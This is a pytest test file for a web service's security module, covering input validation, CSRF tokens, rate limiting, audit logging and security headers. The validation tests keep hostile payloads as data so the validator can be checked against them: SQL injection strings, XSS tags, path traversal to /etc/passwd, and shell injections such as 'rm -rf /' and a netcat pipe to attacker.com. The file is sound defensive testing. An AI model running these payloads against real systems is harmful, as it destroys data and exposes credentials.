"""
Tests for Security Best Practices

Tests all security features:
- Input validation and sanitization
- CSRF protection
- Rate limiting
- Secure headers
- Security audit logging

Validates: Requirements 15.1, 15.2, 15.3, 15.4, 15.5
"""

import pytest
import time
from datetime import datetime, timedelta
from services.security_service import (
    SecurityService,
    InputValidator,
    CSRFProtection,
    RateLimiter,
    SecurityAuditLogger,
    SecurityHeadersManager,
    ValidationRule,
    RateLimitConfig,
    SecurityEventType,
    SecurityEventSeverity,
    get_security_service
)


class TestInputValidation:
    """Test input validation and sanitization (Requirement 15.1)"""
    
    def test_sanitize_html(self):
        """Test HTML sanitization"""
        validator = InputValidator()
        
        # Test HTML escaping
        dirty = "<script>alert('xss')</script>"
        clean = validator.sanitize_string(dirty)
        assert "<script>" not in clean
        assert "&lt;script&gt;" in clean
    
    def test_detect_sql_injection(self):
        """Test SQL injection detection"""
        validator = InputValidator()
        rule = ValidationRule(field_name="query", required=True)
        
        # Test SQL injection patterns
        sql_attacks = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1 UNION SELECT * FROM passwords",
        ]
        
        for attack in sql_attacks:
            is_valid, error = validator.validate_string(attack, rule)
            assert not is_valid, f"Should detect SQL injection: {attack}"
            assert "SQL" in error
    
    def test_detect_xss(self):
        """Test XSS detection"""
        validator = InputValidator()
        rule = ValidationRule(field_name="content", required=True)
        
        # Test XSS patterns
        xss_attacks = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='evil.com'></iframe>",
        ]
        
        for attack in xss_attacks:
            is_valid, error = validator.validate_string(attack, rule)
            assert not is_valid, f"Should detect XSS: {attack}"
            assert "XSS" in error
    
    def test_detect_path_traversal(self):
        """Test path traversal detection"""
        validator = InputValidator()
        rule = ValidationRule(field_name="path", required=True)
        
        # Test path traversal patterns
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "%2e%2e%2f",
        ]
        
        for attack in path_attacks:
            is_valid, error = validator.validate_string(attack, rule)
            assert not is_valid, f"Should detect path traversal: {attack}"
            assert "path traversal" in error.lower()
    
    def test_detect_command_injection(self):
        """Test command injection detection"""
        validator = InputValidator()
        rule = ValidationRule(field_name="command", required=True)
        
        # Test command injection patterns
        cmd_attacks = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "$(whoami)",
        ]
        
        for attack in cmd_attacks:
            is_valid, error = validator.validate_string(attack, rule)
            assert not is_valid, f"Should detect command injection: {attack}"
            assert "command injection" in error.lower()
    
    def test_length_validation(self):
        """Test length validation"""
        validator = InputValidator()
        
        # Test min length
        rule = ValidationRule(field_name="password", min_length=8)
        is_valid, error = validator.validate_string("short", rule)
        assert not is_valid
        assert "at least 8" in error
        
        # Test max length
        rule = ValidationRule(field_name="username", max_length=20)
        is_valid, error = validator.validate_string("a" * 30, rule)
        assert not is_valid
        assert "at most 20" in error
    
    def test_pattern_validation(self):
        """Test pattern validation"""
        validator = InputValidator()
        
        # Test email pattern
        rule = ValidationRule(
            field_name="email",
            pattern=r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
        )
        
        is_valid, _ = validator.validate_string("valid@example.com", rule)
        assert is_valid
        
        is_valid, error = validator.validate_string("invalid-email", rule)
        assert not is_valid
        assert "format is invalid" in error
    
    def test_allowed_values(self):
        """Test allowed values validation"""
        validator = InputValidator()
        
        rule = ValidationRule(
            field_name="status",
            allowed_values=["active", "inactive", "pending"]
        )
        
        is_valid, _ = validator.validate_string("active", rule)
        assert is_valid
        
        is_valid, error = validator.validate_string("invalid", rule)
        assert not is_valid
        assert "must be one of" in error
    
    def test_validate_dict(self):
        """Test dictionary validation"""
        validator = InputValidator()
        
        rules = [
            ValidationRule(field_name="username", required=True, min_length=3, max_length=20),
            ValidationRule(field_name="email", required=True, pattern=r"^[\w\.-]+@[\w\.-]+\.\w+$"),
            ValidationRule(field_name="age", required=False),
        ]
        
        # Valid data
        data = {
            "username": "testuser",
            "email": "test@example.com",
            "age": 25
        }
        is_valid, errors, sanitized = validator.validate_dict(data, rules)
        assert is_valid
        assert len(errors) == 0
        assert sanitized["username"] == "testuser"
        
        # Invalid data
        data = {
            "username": "ab",  # Too short
            "email": "invalid-email"
        }
        is_valid, errors, sanitized = validator.validate_dict(data, rules)
        assert not is_valid
        assert len(errors) > 0


class TestCSRFProtection:
    """Test CSRF protection (Requirement 15.2)"""
    
    def test_generate_token(self):
        """Test CSRF token generation"""
        csrf = CSRFProtection()
        
        token = csrf.generate_token("session123")
        assert token is not None
        assert len(token) > 20
    
    def test_validate_token(self):
        """Test CSRF token validation"""
        csrf = CSRFProtection()
        
        token = csrf.generate_token("session123")
        
        # Valid token
        assert csrf.validate_token(token) is True
        
        # Invalid token
        assert csrf.validate_token("invalid-token") is False
    
    def test_token_expiry(self):
        """Test CSRF token expiration"""
        csrf = CSRFProtection(token_expiry_seconds=1)
        
        token = csrf.generate_token("session123")
        assert csrf.validate_token(token) is True
        
        # Wait for expiry
        time.sleep(1.1)
        assert csrf.validate_token(token) is False
    
    def test_invalidate_token(self):
        """Test token invalidation"""
        csrf = CSRFProtection()
        
        token = csrf.generate_token("session123")
        assert csrf.validate_token(token) is True
        
        csrf.invalidate_token(token)
        assert csrf.validate_token(token) is False
    
    def test_cleanup_expired_tokens(self):
        """Test cleanup of expired tokens"""
        csrf = CSRFProtection(token_expiry_seconds=1)
        
        token1 = csrf.generate_token("session1")
        time.sleep(1.1)
        token2 = csrf.generate_token("session2")
        
        csrf.cleanup_expired_tokens()
        
        assert csrf.validate_token(token1) is False
        assert csrf.validate_token(token2) is True


class TestRateLimiting:
    """Test rate limiting (Requirement 15.3)"""
    
    def test_basic_rate_limit(self):
        """Test basic rate limiting"""
        config = RateLimitConfig(
            requests_per_minute=5,
            requests_per_hour=100,
            requests_per_day=1000
        )
        limiter = RateLimiter(config)
        
        # First 5 requests should succeed
        for i in range(5):
            is_allowed, reason = limiter.is_allowed("test-ip")
            assert is_allowed, f"Request {i+1} should be allowed"
        
        # 6th request should be blocked
        is_allowed, reason = limiter.is_allowed("test-ip")
        assert not is_allowed
        assert "per minute" in reason
    
    def test_burst_protection(self):
        """Test burst protection"""
        config = RateLimitConfig(burst_size=3)
        limiter = RateLimiter(config)
        
        # Rapid requests
        for i in range(3):
            is_allowed, _ = limiter.is_allowed("burst-ip")
            assert is_allowed
        
        # 4th rapid request should be blocked
        is_allowed, reason = limiter.is_allowed("burst-ip")
        assert not is_allowed
        assert "Burst limit" in reason
    
    def test_per_ip_isolation(self):
        """Test that rate limits are per IP"""
        config = RateLimitConfig(requests_per_minute=2)
        limiter = RateLimiter(config)
        
        # IP1 uses its quota
        limiter.is_allowed("ip1")
        limiter.is_allowed("ip1")
        is_allowed, _ = limiter.is_allowed("ip1")
        assert not is_allowed
        
        # IP2 should still be allowed
        is_allowed, _ = limiter.is_allowed("ip2")
        assert is_allowed
    
    def test_reset_rate_limit(self):
        """Test rate limit reset"""
        config = RateLimitConfig(requests_per_minute=2)
        limiter = RateLimiter(config)
        
        # Use up quota
        limiter.is_allowed("test-ip")
        limiter.is_allowed("test-ip")
        is_allowed, _ = limiter.is_allowed("test-ip")
        assert not is_allowed
        
        # Reset
        limiter.reset("test-ip")
        
        # Should be allowed again
        is_allowed, _ = limiter.is_allowed("test-ip")
        assert is_allowed
    
    def test_ip_blocking(self):
        """Test IP blocking after excessive violations"""
        config = RateLimitConfig(requests_per_day=5)
        limiter = RateLimiter(config)
        
        # Exceed daily limit
        for i in range(6):
            limiter.is_allowed("blocked-ip")
        
        # Should be blocked
        is_allowed, reason = limiter.is_allowed("blocked-ip")
        assert not is_allowed
        assert "blocked" in reason.lower()


class TestSecurityAuditLogging:
    """Test security audit logging (Requirement 15.5)"""
    
    def test_log_event(self):
        """Test logging security events"""
        logger = SecurityAuditLogger()
        
        from services.security_service import SecurityEvent
        
        event = SecurityEvent(
            event_type=SecurityEventType.LOGIN_SUCCESS,
            severity=SecurityEventSeverity.INFO,
            timestamp=datetime.utcnow(),
            user_id="user123",
            ip_address="192.168.1.1",
            endpoint="/api/login",
            details={"method": "POST"},
            success=True
        )
        
        logger.log_event(event)
        
        assert len(logger.events) == 1
        assert logger.events[0].user_id == "user123"
    
    def test_query_events(self):
        """Test querying audit events"""
        logger = SecurityAuditLogger()
        
        from services.security_service import SecurityEvent
        
        # Log multiple events
        for i in range(5):
            event = SecurityEvent(
                event_type=SecurityEventType.LOGIN_ATTEMPT,
                severity=SecurityEventSeverity.INFO,
                timestamp=datetime.utcnow(),
                user_id=f"user{i}",
                ip_address="192.168.1.1",
                endpoint="/api/login",
                details={},
                success=i % 2 == 0
            )
            logger.log_event(event)
        
        # Query all events
        events = logger.get_events()
        assert len(events) == 5
        
        # Query by event type
        events = logger.get_events(event_type=SecurityEventType.LOGIN_ATTEMPT)
        assert len(events) == 5
        
        # Query by user
        events = logger.get_events(user_id="user1")
        assert len(events) == 1
    
    def test_detect_suspicious_activity(self):
        """Test suspicious activity detection"""
        logger = SecurityAuditLogger()
        
        from services.security_service import SecurityEvent
        
        # Simulate multiple failed logins
        for i in range(10):
            event = SecurityEvent(
                event_type=SecurityEventType.LOGIN_FAILURE,
                severity=SecurityEventSeverity.WARNING,
                timestamp=datetime.utcnow(),
                user_id=None,
                ip_address="192.168.1.100",
                endpoint="/api/login",
                details={},
                success=False
            )
            logger.log_event(event)
        
        suspicious = logger.get_suspicious_activity(time_window_minutes=60)
        
        assert len(suspicious) > 0
        assert suspicious[0]['type'] == 'multiple_failed_logins'
        assert suspicious[0]['ip_address'] == '192.168.1.100'
        assert suspicious[0]['count'] >= 5
    
    def test_rate_limit_violation_detection(self):
        """Test detection of excessive rate limit violations"""
        logger = SecurityAuditLogger()
        
        from services.security_service import SecurityEvent
        
        # Simulate rate limit violations
        for i in range(15):
            event = SecurityEvent(
                event_type=SecurityEventType.RATE_LIMIT_EXCEEDED,
                severity=SecurityEventSeverity.WARNING,
                timestamp=datetime.utcnow(),
                user_id=None,
                ip_address="192.168.1.200",
                endpoint="/api/data",
                details={},
                success=False
            )
            logger.log_event(event)
        
        suspicious = logger.get_suspicious_activity(time_window_minutes=60)
        
        violations = [s for s in suspicious if s['type'] == 'excessive_rate_limit_violations']
        assert len(violations) > 0
        assert violations[0]['ip_address'] == '192.168.1.200'


class TestSecurityHeaders:
    """Test security headers (Requirement 15.4)"""
    
    def test_get_security_headers(self):
        """Test security headers generation"""
        manager = SecurityHeadersManager()
        headers = manager.get_security_headers()
        
        # Check required headers
        assert "X-Frame-Options" in headers
        assert headers["X-Frame-Options"] == "DENY"
        
        assert "X-Content-Type-Options" in headers
        assert headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-XSS-Protection" in headers
        assert "1" in headers["X-XSS-Protection"]
        
        assert "Strict-Transport-Security" in headers
        assert "max-age" in headers["Strict-Transport-Security"]
        
        assert "Content-Security-Policy" in headers
        assert "default-src" in headers["Content-Security-Policy"]
        
        assert "Referrer-Policy" in headers
        assert "Permissions-Policy" in headers


class TestSecurityService:
    """Test integrated security service"""
    
    def test_security_service_initialization(self):
        """Test security service initialization"""
        service = get_security_service()
        
        assert service is not None
        assert service.validator is not None
        assert service.csrf is not None
        assert service.rate_limiter is not None
        assert service.audit_logger is not None
    
    def test_validate_input_integration(self):
        """Test input validation through service"""
        service = get_security_service()
        
        rules = [
            ValidationRule(field_name="username", required=True, min_length=3),
            ValidationRule(field_name="email", required=True),
        ]
        
        data = {
            "username": "testuser",
            "email": "test@example.com"
        }
        
        is_valid, errors, sanitized = service.validate_input(data, rules)
        assert is_valid
        assert len(errors) == 0
    
    def test_csrf_integration(self):
        """Test CSRF protection through service"""
        service = get_security_service()
        
        token = service.generate_csrf_token("session123")
        assert service.validate_csrf_token(token) is True
    
    def test_rate_limit_integration(self):
        """Test rate limiting through service"""
        service = get_security_service()
        
        is_allowed, reason = service.check_rate_limit("test-ip")
        assert is_allowed
    
    def test_audit_logging_integration(self):
        """Test audit logging through service"""
        service = get_security_service()
        
        service.log_security_event(
            event_type=SecurityEventType.LOGIN_SUCCESS,
            severity=SecurityEventSeverity.INFO,
            user_id="user123",
            ip_address="192.168.1.1",
            endpoint="/api/login",
            details={"method": "POST"},
            success=True
        )
        
        events = service.get_audit_events(user_id="user123")
        assert len(events) > 0
    
    def test_security_headers_integration(self):
        """Test security headers through service"""
        service = get_security_service()
        
        headers = service.get_security_headers()
        assert len(headers) > 0
        assert "X-Frame-Options" in headers


class TestSecurityRequirements:
    """Test that all security requirements are met"""
    
    def test_requirement_15_1_input_validation(self):
        """
        Requirement 15.1: Input validation and sanitization
        
        Verify that the system validates and sanitizes all user input
        """
        validator = InputValidator()
        
        # Test sanitization
        dirty = "<script>alert('xss')</script>"
        clean = validator.sanitize_string(dirty)
        assert "<script>" not in clean
        
        # Test validation
        rule = ValidationRule(field_name="test", required=True)
        is_valid, _ = validator.validate_string("'; DROP TABLE users; --", rule)
        assert not is_valid
    
    def test_requirement_15_2_csrf_protection(self):
        """
        Requirement 15.2: CSRF protection
        
        Verify that CSRF tokens are generated and validated
        """
        csrf = CSRFProtection()
        
        token = csrf.generate_token("session")
        assert token is not None
        assert csrf.validate_token(token) is True
        assert csrf.validate_token("invalid") is False
    
    def test_requirement_15_3_rate_limiting(self):
        """
        Requirement 15.3: Rate limiting
        
        Verify that rate limiting prevents excessive requests
        """
        config = RateLimitConfig(requests_per_minute=3)
        limiter = RateLimiter(config)
        
        # Allow first 3 requests
        for i in range(3):
            is_allowed, _ = limiter.is_allowed("test-ip")
            assert is_allowed
        
        # Block 4th request
        is_allowed, reason = limiter.is_allowed("test-ip")
        assert not is_allowed
        assert reason is not None
    
    def test_requirement_15_4_secure_headers(self):
        """
        Requirement 15.4: Secure headers
        
        Verify that security headers are properly configured
        """
        manager = SecurityHeadersManager()
        headers = manager.get_security_headers()
        
        required_headers = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
            "Referrer-Policy",
            "Permissions-Policy"
        ]
        
        for header in required_headers:
            assert header in headers, f"Missing required header: {header}"
    
    def test_requirement_15_5_audit_logging(self):
        """
        Requirement 15.5: Security audit logging
        
        Verify that security events are logged and queryable
        """
        logger = SecurityAuditLogger()
        
        from services.security_service import SecurityEvent
        
        # Log event
        event = SecurityEvent(
            event_type=SecurityEventType.LOGIN_SUCCESS,
            severity=SecurityEventSeverity.INFO,
            timestamp=datetime.utcnow(),
            user_id="user123",
            ip_address="192.168.1.1",
            endpoint="/api/login",
            details={"method": "POST"},
            success=True
        )
        logger.log_event(event)
        
        # Query events
        events = logger.get_events(user_id="user123")
        assert len(events) > 0
        assert events[0].event_type == SecurityEventType.LOGIN_SUCCESS
        
        # Detect suspicious activity
        suspicious = logger.get_suspicious_activity()
        assert isinstance(suspicious, list)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
